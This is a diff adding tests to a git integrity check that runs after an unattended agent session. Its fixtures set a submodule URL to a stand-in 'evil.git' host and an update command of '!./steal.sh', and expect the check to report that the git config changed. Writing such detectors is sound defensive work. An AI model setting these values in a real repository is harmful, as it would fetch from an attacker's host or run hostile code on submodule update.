@@ -261,6 +261,16 @@ describe('git: the check after an AFK run', () => {
       expect(await check()).toEqual([]);
     }));
 
+  // Where `git submodule update` fetches from is then the config's word, not the commit's.
+  test('a run that points a submodule elsewhere than its committed `.gitmodules` says breaks the invariants', () =>
+    started(async ({ root, inRun, check }) => {
+      inRun('-c', 'protocol.file.allow=always', 'submodule', 'add', '--quiet', join(root, 'widgets-origin.git'), 'vendor/widgets');
+      inRun('commit', '--quiet', '-m', 'Vendor the widgets');
+      inRun('config', 'submodule.vendor/widgets.url', 'https://example.com/evil.git');
+
+      expect(await check()).toEqual(['The run changed the git config.']);
+    }));
+
   test.each<[string, (run: Started) => void, string[]]>([
     [
       'switches branch',
@@ -294,6 +304,11 @@ describe('git: the check after an AFK run', () => {
     [
       'sets the command a submodule updates with',
       ({ inRun }) => inRun('config', 'submodule.vendor/widgets.update', '!./steal.sh'),
+      ['The run changed the git config.'],
+    ],
+    [
+      'sets the URL of a submodule no commit has',
+      ({ inRun }) => inRun('config', 'submodule.vendor/widgets.url', 'https://example.com/evil.git'),
       ['The run changed the git config.'],
     ],
     [
